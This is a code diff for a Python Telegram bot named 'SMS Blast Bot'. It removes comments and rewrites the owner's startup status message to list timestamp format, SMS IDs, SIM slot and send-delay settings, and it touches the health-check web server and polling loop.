-    text = f"📋 <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n<i>Per-user history unke Stats mein hai.</i>"
+    text = f"📋 <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>"
     await safe_edit(cq.message, text, reply_markup=kb([(f"🔙 {sc('back')}", "owner:home")]))
 
 # ========== USER HOME ==========
@@ -3333,7 +3284,7 @@ async def user_info(cq: CallbackQuery, state: FSMContext):
 async def noop(cq: CallbackQuery):
     await safe_answer(cq)
 
-# ========== WEB SERVER FOR RENDER ==========
+# ========== WEB SERVER ==========
 async def health_check(request):
     return web.Response(text="OK", status=200)
 
@@ -3352,7 +3303,6 @@ async def start_web_server():
     await site.start()
     log.info(f"✅ Web server on port {port}")
 
-# ========== GLOBAL ERROR HANDLER ==========
 async def global_error_handler(event, exception):
     log.error(f"⚠️ Error on {type(event).__name__}: {exception}")
 
@@ -3364,8 +3314,6 @@ async def main():
         log.error(f"Web server failed: {e}")
 
     bot = Bot(token=BOT_TOKEN)
-
-    # ✅ CRITICAL: Clear webhook + drop pending updates
     try:
         await bot.delete_webhook(drop_pending_updates=True)
         log.info("✅ Webhook cleared")
@@ -3390,17 +3338,16 @@ async def main():
             f"🚀 <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
             f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
             f"🔄 <b>Scanner Interval:</b> 5 minutes\n"
-            f"🛡 <b>Error Handler:</b> ENABLED\n"
-            f"🌐 <b>Web Server:</b> ENABLED\n"
-            f"✅ <b>Premium Emoji Buttons:</b> DISABLED (safe mode)\n"
-            f"📝 <b>Custom Message:</b> FULL (no limit)\n"
+            f"✅ <b>Timestamp:</b> ISO format (Android app compatible)\n"
+            f"✅ <b>Unique SMS ID:</b> ENABLED\n"
+            f"✅ <b>SIM Slot Default:</b> 1\n"
+            f"✅ <b>Speed:</b> 0.3s minimum delay\n"
             f"👤 <b>Owner:</b> {SUPER_ADMIN_NAME}",
             parse_mode="HTML"
         )
     except Exception as e:
         log.warning(f"Owner notify: {e}")
 
-    # ✅ Auto-restart polling on network errors
     while True:
         try:
             await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
